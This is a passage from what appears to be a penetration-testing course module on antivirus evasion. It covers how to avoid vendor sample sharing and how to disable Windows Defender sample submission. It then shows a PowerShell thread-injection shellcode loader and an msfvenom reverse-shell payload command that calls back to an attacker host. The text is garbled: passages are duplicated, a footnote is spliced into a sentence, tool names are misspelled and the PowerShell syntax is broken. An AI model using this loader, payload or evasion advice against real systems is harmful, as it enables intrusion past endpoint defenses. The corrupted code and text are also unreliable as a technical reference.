
This means that shortly after we have submitted our sample, most of the AV vendors will run it inside their custom sandbox and machine learning engines to build specific detection signatures, rendering our offensive tooling unusable.

As an alternative to VirusTotal, we should resort to AntiScan.Me.⁵⁷ This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties. The service offers up to four days and additional ones at a small fee after the daily limit has been reached.

However, relying on tools such as AntiScan.Me is considered a last resort when we don't know the specifics of our target's AV vendor. If we know specifics on the other hand, we should build a dedicated VM that respects the customer experience as closely as possible.

Regardless of the tested product, we should always make sure to disable sample submission so that we don't incur the drawback as VirusTotal. For instance, Windows Defender's Automatic Sample Submission can be disabled by navigating to Windows Security > Virus & threat protection > disabling the relative option as illustrated in the image below.

![](img/336d6ea891e7464f18ad64426619ced4_359_0.png)

⁵⁷ (antiscan.me, 2022), https://antiscan.me

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec
Penetration Testing with Kali Linux

Figure 195: Disabling Windows Defender Automated Sample Submission

Having such a targeted scenario allows us to test AV evasion vectors without worrying about our sample being submitted for further analysis.

Since automatic sample submission allows Windows Defender to get our sample analyzed by its machine learning engines, we should only enable it once we are confident our bypasses will be effective and only if our target sample submission enabled.

> Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited.

Another rule of thumb should be when developing AV bypasses is to always prefer custom code. As we have learned at the beginning of this Module, AV signatures are extrapolated from the malware sample and thus, the more novel and diversified our code is, the fewer chances we have to incur any existing detection.

## 12.3.2 Evading AV with Thread Injection

Now that we have a general understanding of the detection techniques used in antivirus and the relative bypass methods, we can turn our focus to a practical example.

Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not impossible. Considering time limitations during a typical penetration test, it is far more efficient to target the specific antivirus product deployed in the target network.

For the purposes of this Module, we will interact with Avira Free Security version 1.1.68.29553 on our Windows 11 client. Once we connect via RDP with the provided credentials, we'll notice that Avira is already installed and can be launched from the Desktop shortcut. Once started, we can navigate to the Security panel from the left menu and click on Protection Options:

# OffSec
Penetration Testing with Kali Linux

# Avira Free Security

![](img/336d6ea891e7464f18ad64426619ced4_361_0.png)

Figure 196: Searching for Protections Options in the Avira Menu

Launching this menu section will display the currently running protections where we can verify if the Real-Time protection is enabled and manually enable it if needed.

# Avira Free Security

![](img/336d6ea891e7464f18ad64426619ced4_361_1.png)

Figure 197: Avira Control Center.

# OffSec
Penetration Testing with Kali Linux

As a first step when testing AV products, we should verify that the antivirus is working as intended. We will use the Metasploit payload we generated earlier and scan it with Avira.

After transferring the malicious PE to our Windows client, we are almost immediately warned about the malicious content of the uploaded file. In this case, we are presented with an error message indicating that our file has been blocked.

![](img/336d6ea891e7464f18ad64426619ced4_362_0.png)

Figure 198: Avira notification the file was flagged

> Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited.

Depending on how restricted the environment is, antivirus products typically enforce quarantine by storing samples in memory.⁵⁷ (antiscan.me, 2022), https://antiscan.me

# OffSec
# Avira Free Security

# OffSec
Penetration Testing with Kali Linux

The script starts by importing VirtualAlloc, CreateThread from kernel32.dll, as we use memset from msvcrt.dll. These functions allow us to allocate memory, create a thread, and write binary data to the memory, respectively. Once again, notice that we are allocating the memory, creating a thread, and writing to the allocated memory.

```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lAddress, uint dwSize, uint flAllocationType, int flProtect);
```

```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpAddress, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

```csharp
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, IntPtr src, int count);
```

The main logic starts by allocating a block of memory using VirtualAlloc, which takes each byte of the payload stored in the sc array and writes it to the newly-allocated memory using memset.

```powershell
[[]]$sc = <place your shell code>

$size = 0x1000;

if ($sc.length -gt 0x1000) {$size = $sc.Length};

$x = $WinFunc:VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le($sc.length-1);$i++){$WinFunc:memset([IntPtr]$x.ToInt32($i),$sc[$i], 1)};
```

As a final step, our memory payload is executed through the script using the CreateThread API.

```powershell
$WinFunc:CreateThread(0,0,$x,0);for { Start-sleep 60 };
```

Our chosen payload is missing from our script, but can be generated using msfven. We are going to keep the payload identical to the one used in previous tests for consistency.

```bash
kali: $ msfven -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=443 -f
powershell -v c
```

+   - No platform was selected, choosing Msff:Module::Windows from the payload
- No arch selected, selecting x86 from the payload
- No encoder specified, outputting raw payload
Payload size: 699 bytes
Final size of payload file: 3454 bytes
